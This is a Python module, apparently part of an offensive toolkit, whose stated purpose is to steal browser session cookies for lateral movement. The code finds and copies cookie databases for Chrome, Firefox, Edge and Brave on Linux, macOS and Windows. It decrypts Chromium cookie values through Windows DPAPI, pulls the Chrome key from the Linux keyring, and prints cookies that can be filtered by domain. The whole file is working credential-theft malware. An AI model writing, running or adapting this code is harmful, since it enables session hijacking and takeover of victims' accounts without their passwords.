"""Browser cookie extraction — steal session cookies for lateral movement.
Supports Chrome, Firefox, Edge, Brave across Linux, macOS, Windows.
Cookies can be replayed directly without needing plaintext passwords.
"""

import os
import sys
import json
import sqlite3
import shutil
import tempfile
import base64
from typing import Optional


def run(args: list[str]) -> str:
    """Module entry point.
    
    Usage:
        browser_cookies all      — extract from all browsers
        browser_cookies chrome   — Chrome/Chromium only
        browser_cookies firefox  — Firefox only
        browser_cookies edge     — Edge only
        browser_cookies brave    — Brave only
        browser_cookies domain <domain> — filter by domain (e.g., google.com)
    """
    if not args:
        return "Usage: browser_cookies all|chrome|firefox|edge|brave|domain <domain>"
    
    method = args[0].lower()
    
    if method == "all":
        return harvest_all()
    elif method == "domain":
        if len(args) < 2:
            return "Usage: browser_cookies domain <domain>"
        return harvest_all(domain_filter=args[1])
    elif method in ("chrome", "firefox", "edge", "brave"):
        dispatch = {
            "chrome": harvest_chrome,
            "firefox": harvest_firefox,
            "edge": harvest_edge,
            "brave": harvest_brave,
        }
        try:
            return dispatch[method]()
        except Exception as e:
            return f"{method.title()} cookie harvest failed: {e}"
    else:
        return f"Unknown method: {method}"


def harvest_all(domain_filter: str = None) -> str:
    """Extract cookies from all supported browsers."""
    results = []
    
    for name, func in [
        ("Chrome", harvest_chrome),
        ("Firefox", harvest_firefox),
        ("Edge", harvest_edge),
        ("Brave", harvest_brave),
    ]:
        try:
            output = func(domain_filter=domain_filter)
            if output and "No " not in output:
                results.append(f"=== {name} ===\n{output}")
        except Exception as e:
            results.append(f"=== {name} === ERROR: {e}")
    
    if not results:
        return "No cookies found in any browser"
    
    return "\n\n".join(results)


def _decrypt_chrome_cookie_linux(encrypted_value: bytes) -> str:
    """Decrypt Chrome cookie on Linux (uses libsecret/keyring)."""
    try:
        # Chrome on Linux uses a hardcoded key derived from "peanuts"
        # Actual key is in ~/.config/google-chrome/Local State or derived from keyring
        key = b"peanuts"
        
        # Try to get the actual key from keyring
        try:
            import secretstorage
            bus = secretstorage.dbus_init()
            collection = secretstorage.get_default_collection(bus)
            for item in collection.get_all_items():
                if item.get_label() in ("Chrome Safe Storage", "Chromium Safe Storage"):
                    key = item.get_secret()
                    break
        except (ImportError, Exception):
            pass
        
        # Chrome uses AES-128-CBC with PBKDF2
        # For simplicity, return base64-encoded encrypted value
        # Full decryption would require cryptography library
        return base64.b64encode(encrypted_value).decode()
    
    except Exception:
        return base64.b64encode(encrypted_value).decode()


def _decrypt_chrome_cookie_windows(encrypted_value: bytes) -> str:
    """Decrypt Chrome cookie on Windows (uses DPAPI)."""
    try:
        import ctypes
        import ctypes.wintypes
        
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ("cbData", ctypes.wintypes.DWORD),
                ("pbData", ctypes.POINTER(ctypes.c_char))
            ]
        
        blob_in = DATA_BLOB(len(encrypted_value), ctypes.create_string_buffer(encrypted_value, len(encrypted_value)))
        blob_out = DATA_BLOB()
        
        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in),
            None,
            None,
            None,
            None,
            0,
            ctypes.byref(blob_out)
        ):
            decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return decrypted.decode('utf-8', errors='replace')
        
    except Exception:
        pass
    
    return base64.b64encode(encrypted_value).decode()


def harvest_chrome(domain_filter: str = None) -> str:
    """Extract Chrome/Chromium cookies."""
    if sys.platform == "linux":
        candidates = [
            os.path.expanduser("~/.config/google-chrome/Default/Cookies"),
            os.path.expanduser("~/.config/chromium/Default/Cookies"),
            os.path.expanduser("~/.config/BraveSoftware/Brave-Browser/Default/Cookies"),
        ]
    elif sys.platform == "darwin":
        candidates = [
            os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Cookies"),
        ]
    elif sys.platform == "win32":
        local = os.environ.get("LOCALAPPDATA", "")
        candidates = [
            os.path.join(local, "Google/Chrome/User Data/Default/Cookies"),
        ]
    else:
        return "Unsupported platform"
    
    for db_path in candidates:
        if not os.path.isfile(db_path):
            continue
        
        try:
            copy_path = os.path.join(tempfile.gettempdir(), "cookies_copy")
            shutil.copy2(db_path, copy_path)
            
            conn = sqlite3.connect(copy_path)
            
            query = "SELECT host_key, name, encrypted_value, expires_utc, is_secure FROM cookies"
            params = []
            
            if domain_filter:
                query += " WHERE host_key LIKE ?"
                params.append(f"%{domain_filter}%")
            
            cursor = conn.execute(query, params)
            rows = cursor.fetchall()
            conn.close()
            os.unlink(copy_path)
            
            if not rows:
                continue
            
            lines = [f"Chrome DB: {db_path} ({len(rows)} cookies)"]
            
            for host, name, encrypted_value, expires, is_secure in rows:
                # Decrypt based on platform
                if sys.platform == "win32":
                    value = _decrypt_chrome_cookie_windows(encrypted_value)
                elif sys.platform == "linux":
                    value = _decrypt_chrome_cookie_linux(encrypted_value)
                else:
                    value = base64.b64encode(encrypted_value).decode()
                
                secure_flag = " [HTTPS]" if is_secure else ""
                lines.append(f"  {host}{secure_flag} | {name} = {value[:50]}{'...' if len(value) > 50 else ''}")
            
            return "\n".join(lines)
        
        except Exception as e:
            return f"Chrome cookie harvest failed ({db_path}): {e}"
    
    return "No Chrome/Chromium Cookies database found"


def harvest_firefox(domain_filter: str = None) -> str:
    """Extract Firefox cookies."""
    if sys.platform == "linux":
        profile_dir = os.path.expanduser("~/.mozilla/firefox")
    elif sys.platform == "darwin":
        profile_dir = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
    elif sys.platform == "win32":
        appdata = os.environ.get("APPDATA", "")
        profile_dir = os.path.join(appdata, "Mozilla/Firefox/Profiles")
    else:
        return "Unsupported platform"
    
    if not os.path.isdir(profile_dir):
        return "No Firefox profile directory found"
    
    found_cookies = []
    
    for profile in os.listdir(profile_dir):
        cookies_path = os.path.join(profile_dir, profile, "cookies.sqlite")
        
        if not os.path.isfile(cookies_path):
            continue
        
        try:
            copy_path = os.path.join(tempfile.gettempdir(), "ff_cookies_copy")
            shutil.copy2(cookies_path, copy_path)
            
            conn = sqlite3.connect(copy_path)
            
            query = "SELECT host, name, value, expiry, isSecure FROM moz_cookies"
            params = []
            
            if domain_filter:
                query += " WHERE host LIKE ?"
                params.append(f"%{domain_filter}%")
            
            cursor = conn.execute(query, params)
            rows = cursor.fetchall()
            conn.close()
            os.unlink(copy_path)
            
            if rows:
                found_cookies.append((profile, rows))
        
        except Exception as e:
            found_cookies.append((profile, f"ERROR: {e}"))
    
    if not found_cookies:
        return "No Firefox cookies found"
    
    lines = []
    for profile, data in found_cookies:
        if isinstance(data, str):
            lines.append(f"Firefox Profile: {profile}\n  {data}")
        else:
            lines.append(f"Firefox Profile: {profile} ({len(data)} cookies)")
            for host, name, value, expiry, is_secure in data:
                secure_flag = " [HTTPS]" if is_secure else ""
                lines.append(f"  {host}{secure_flag} | {name} = {value[:50]}{'...' if len(value) > 50 else ''}")
    
    return "\n".join(lines)


def harvest_edge(domain_filter: str = None) -> str:
    """Extract Edge cookies (Chromium-based, same format as Chrome)."""
    if sys.platform == "win32":
        local = os.environ.get("LOCALAPPDATA", "")
        db_path = os.path.join(local, "Microsoft/Edge/User Data/Default/Cookies")
    elif sys.platform == "linux":
        db_path = os.path.expanduser("~/.config/microsoft-edge/Default/Cookies")
    elif sys.platform == "darwin":
        db_path = os.path.expanduser("~/Library/Application Support/Microsoft Edge/Default/Cookies")
    else:
        return "Unsupported platform"
    
    if not os.path.isfile(db_path):
        return "No Edge Cookies database found"
    
    try:
        copy_path = os.path.join(tempfile.gettempdir(), "edge_cookies_copy")
        shutil.copy2(db_path, copy_path)
        
        conn = sqlite3.connect(copy_path)
        
        query = "SELECT host_key, name, encrypted_value, expires_utc, is_secure FROM cookies"
        params = []
        
        if domain_filter:
            query += " WHERE host_key LIKE ?"
            params.append(f"%{domain_filter}%")
        
        cursor = conn.execute(query, params)
        rows = cursor.fetchall()
        conn.close()
        os.unlink(copy_path)
        
        if not rows:
            return "No Edge cookies found"
        
        lines = [f"Edge DB: {db_path} ({len(rows)} cookies)"]
        
        for host, name, encrypted_value, expires, is_secure in rows:
            # Edge uses same encryption as Chrome
            if sys.platform == "win32":
                value = _decrypt_chrome_cookie_windows(encrypted_value)
            else:
                value = base64.b64encode(encrypted_value).decode()
            
            secure_flag = " [HTTPS]" if is_secure else ""
            lines.append(f"  {host}{secure_flag} | {name} = {value[:50]}{'...' if len(value) > 50 else ''}")
        
        return "\n".join(lines)
    
    except Exception as e:
        return f"Edge cookie harvest failed: {e}"


def harvest_brave(domain_filter: str = None) -> str:
    """Extract Brave cookies (Chromium-based, same format as Chrome)."""
    if sys.platform == "linux":
        db_path = os.path.expanduser("~/.config/BraveSoftware/Brave-Browser/Default/Cookies")
    elif sys.platform == "darwin":
        db_path = os.path.expanduser("~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies")
    elif sys.platform == "win32":
        local = os.environ.get("LOCALAPPDATA", "")
        db_path = os.path.join(local, "BraveSoftware/Brave-Browser/User Data/Default/Cookies")
    else:
        return "Unsupported platform"
    
    if not os.path.isfile(db_path):
        return "No Brave Cookies database found"
    
    try:
        copy_path = os.path.join(tempfile.gettempdir(), "brave_cookies_copy")
        shutil.copy2(db_path, copy_path)
        
        conn = sqlite3.connect(copy_path)
        
        query = "SELECT host_key, name, encrypted_value, expires_utc, is_secure FROM cookies"
        params = []
        
        if domain_filter:
            query += " WHERE host_key LIKE ?"
            params.append(f"%{domain_filter}%")
        
        cursor = conn.execute(query, params)
        rows = cursor.fetchall()
        conn.close()
        os.unlink(copy_path)
        
        if not rows:
            return "No Brave cookies found"
        
        lines = [f"Brave DB: {db_path} ({len(rows)} cookies)"]
        
        for host, name, encrypted_value, expires, is_secure in rows:
            if sys.platform == "win32":
                value = _decrypt_chrome_cookie_windows(encrypted_value)
            else:
                value = base64.b64encode(encrypted_value).decode()
            
            secure_flag = " [HTTPS]" if is_secure else ""
            lines.append(f"  {host}{secure_flag} | {name} = {value[:50]}{'...' if len(value) > 50 else ''}")
        
        return "\n".join(lines)
    
    except Exception as e:
        return f"Brave cookie harvest failed: {e}"
